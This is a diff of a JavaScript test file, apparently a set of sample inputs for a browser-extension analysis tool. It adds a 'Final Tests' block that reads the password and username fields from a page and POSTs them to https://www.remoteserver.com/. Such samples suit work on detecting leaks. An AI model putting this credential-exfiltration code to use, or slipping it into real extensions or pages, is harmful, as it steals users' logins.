@@ -103,8 +103,8 @@
 	Member Declaration Test
 *******************************/
 	// Examples taken from Shoptimate main.js
-var data = self.data
-var Request = require("request").Request;
+// var data = self.data
+// var Request = require("request").Request;
 
 // tabs.on('ready', function(tab){});
 
@@ -151,7 +151,9 @@ var Request = require("request").Request;
 //     return
 // }
 
-// function example3(argument) {
+// moreExamples2(asdf, wasd, oiu)
+
+// function example3() {
 // 	return "nice"
 // }
 
@@ -221,8 +223,40 @@ var Request = require("request").Request;
 //     case "Jin Huang":
 //         console.log(a)
 // }
-/* vim:set ts=2 sw=2 sts=2 expandtab */
-/* This Source Code Form is subject to the terms of the Mozilla Public
- * License, v. 2.0. If a copy of the MPL was not distributed with this
- * file, You can obtain one at http://mozilla.org/MPL/2.0/. */
 
+
+
+// function onCreated(node){
+// 	console.log(node)
+// }
+
+// var createBookmark = browser.bookmarks.create({
+// 	title: "bookmarks.create() on MDN",
+// 	url: "https://www.stuff.com"
+// });
+
+// createBookmark.then(onCreated)
+
+
+
+
+
+/**************************
+	Final Tests
+***************************/
+
+var pwd = document.getElementById("pwd").value;
+var usr = document.getElementById("usr").value;
+var str = encode(pwd, usr);
+post(str);
+
+function encode(pwd, usr) {
+	return encodeURI(pwd) + encodeURI(usr);
+}
+
+function post(content) {
+	var req = new XMLHttpRequest();
+	var url = "https://www.remoteserver.com/"
+	req.open("POST", url);
+	req.send(content);
+}
